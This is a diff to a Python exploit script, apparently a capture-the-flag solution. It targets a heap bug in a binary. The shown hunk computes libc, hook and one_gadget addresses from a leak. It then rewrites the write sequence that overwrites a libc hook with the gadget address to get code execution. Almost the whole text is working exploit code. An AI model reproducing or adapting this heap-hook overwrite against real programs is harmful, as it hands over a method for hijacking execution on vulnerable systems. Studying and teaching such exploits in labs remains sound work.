@@ -81,20 +81,14 @@ def exploit():
 	libc_base = libc_start_main - off_libc_start
 	libc_free_hook = libc_base + off_free_hook	
 	libc_malloc_hook = libc_base + off_malloc_hook	
-	target_chk = libc_malloc_hook -0x20 -0x3 +0x10	
+	libc_target = libc_base + 0x619f60	
+	one_gadget = libc_base + gadget[0]
+	#one_gadget = libc_base + 0xe569f 
 	
-	one_gadget = libc_base + gadget[1]
+	write_data(0x68, p64(libc_target))
+	write_data(0x68, p64(libc_target))
 	
-	name = "B"*0x10
-	name += p64(target_chk)
-	write_data(0x68, name)
-	free_data(0)	
-	free_data(0)	
-	free_data(diff)
-	
-	conn.interactive()	
-	payload = "a"*(0x10+0x3)
-	payload += p64(one_gadget)
+	payload = p64(one_gadget)
 	write_data(0x68, payload)
 
 	print hex(first_chk)
